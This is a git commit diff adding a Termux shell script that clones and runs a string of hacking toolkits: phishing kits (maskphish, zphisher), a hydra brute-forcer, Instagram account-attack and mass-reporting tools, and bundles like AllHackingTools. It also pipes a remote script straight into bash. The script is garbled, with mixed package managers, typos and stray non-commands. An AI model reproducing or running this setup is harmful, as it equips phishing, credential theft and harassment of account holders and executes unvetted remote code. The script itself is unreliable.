d3dbb945c1e652f82950a3bcb833a415082e1161
Abhihack12 <rajnarayanganjpandey@gmail.com>
2026-06-14 17:13:28 +0530

    Update master.sh

--- master.sh
+++ master.sh
@@ -1,3 +1,98 @@
+[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo -e ${n} "You must be root to run the script${n}"; echo ; exit 1; }
+
+git  clone https://github.com/jaykali/maskphish
+
+# Enter into the directory
+cd maskphish
+
+# Run the script
+bash maskphish.sh
+cd
+apt-get update -y
+apt-get upgrade -y
+pkg install python -y
+pkg install python2 -y
+pkg install git -y
+pip install lolcat
+git clone https://github.com/noob-hackers/infect
+ls
+cd infect
+ls
+bash infect.sh
+cd
+apt update
+apt upgrade
+PKG install python
+  git clone  https://GitHub.com/iamuixtz/termux-hydra.git
+
+cd termux-hydra
+python2 setup.py
+pkg install colourama
+
+next
+cd
+pkg install python2
+
+pkg install git -y
+
+ git clone https://github.com/reblox01/DarkFly-Tool
+cd DarkFly-Tool
+python2 install.py
+cd DarkFly-Tool
+python2 install.py 
+chmod +x install.py
+python2 install.py
+DarkFly
+cd
+pip install -r requirements
+pip install colourama
+pip install lolcat
+git clone --depth=1 https://github.com/htr-tech/zphisher.git
+ cd zphisher
+ 
+bash zphisher.sh
+CD
+
+apt-get update -y
+apt-get upgrade -y
+pkg install python -y
+pkg install python2 -y
+pkg install git -y
+pip install lolcat
+git clone https://github.com/noob-hackers/ighack
+cd HOME
+ls
+cd ighack
+ls
+bash setup
+bash ighack.sh 
+cd
+bash <(curl -s https://raw.githubusercontent.com/trmxvibs/Tool-X/main/setup.sh)
+Tool-x, toolx, tool-x, Toolx
+tool-x
+cd
+#Upgrade all & full packages
+apt update
+apt upgrade
+
+#Add your termux permision
+termux-setup-storage
+
+#Install package git
+apt install git
+
+#clone this repository
+git clone https://github.com/mishakorzik/AllHackingTools
+
+#cd to directory allhackingtools
+cd AllHackingTools
+
+#Start script to install system
+bash Install.sh
+CD
+apt update ; apt install git curl wget php -y ; git clone https://github.com/jarvisstar/instagram-reporter.git ; cd instagram-reporter ; python3 instagram-reporter.py
+
+thanks for use script
 # Clone the repository 
 git  clone https://github.com/jaykali/maskphish
 
